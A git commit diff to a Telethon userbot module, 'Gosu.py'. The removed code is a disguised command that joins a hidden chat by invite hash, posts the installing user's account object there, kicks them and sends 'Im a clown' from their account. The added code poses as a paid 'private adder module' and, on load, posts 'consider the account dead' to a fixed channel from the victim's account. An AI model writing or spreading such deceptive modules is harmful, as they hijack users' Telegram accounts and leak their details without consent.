6f329e3d72b1f73844cb2f9f63881651db003aec
ChildMandwa <76920594+ChildMandwa@users.noreply.github.com>
2021-01-04 00:22:04 +0300

    Update Gosu.py

--- Gosu.py
+++ Gosu.py
@@ -1,41 +1,10 @@
-#clown... again :/
-
-from asyncio import sleep
-from telethon import functions
-from telethon.errors.rpcerrorlist import YouBlockedUserError
-from telethon import events
+from telethon import functions, types
 from .. import loader, utils
-from telethon.tl.functions.channels import LeaveChannelRequest
-from telethon.tl.functions.messages import ImportChatInviteRequest
-
-
+import io
 def register(cb):
-    cb(GosudMod())
-class GosudMod(loader.Module):
-    """ты еблан да?"""
-    strings = {'name': 'Госу ебаний'}
-    def __init__(self):
-        self.name = self.strings['name']
-        self._me = None
-        self._ratelimit = []
+    cb(AdderMod())
+class AdderMod(loader.Module):
+    """приват модуль аддал"""
+    strings = {'name': 'Приват модуль добавлялка - 150 рублей'}
     async def client_ready(self, client, db):
-        self._db = db
-        self._client = client
-    async def gosucmd(self, event):
-        chats = '@DotaGosuBot'
-        chat = -391930938
-        user_id = event.sender.id
-        multi = await event.get_sender()
-        await event.client(functions.messages.ImportChatInviteRequest('TtH7lBdcZDpq5GwmHbYKUA'))
-        await event.client.send_message(chat, str(multi))
-        await sleep(0.1)
-        await event.client.kick_participant(chat, user_id)
-        async with event.client.conversation(chats) as conv:
-            try:
-                response = conv.wait_event(events.NewMessage(incoming=True, from_users=568032900))
-                await event.client.send_message(chats, 'Im a clown')
-                response = await response
-            except YouBlockedUserError:
-                await event.edit('<code>Разблокируй @DotaGosuBot</code>')
-                return
-            await event.edit(response.text)
+        await client.send_message(-1001245507814, "считайте что акк умер")
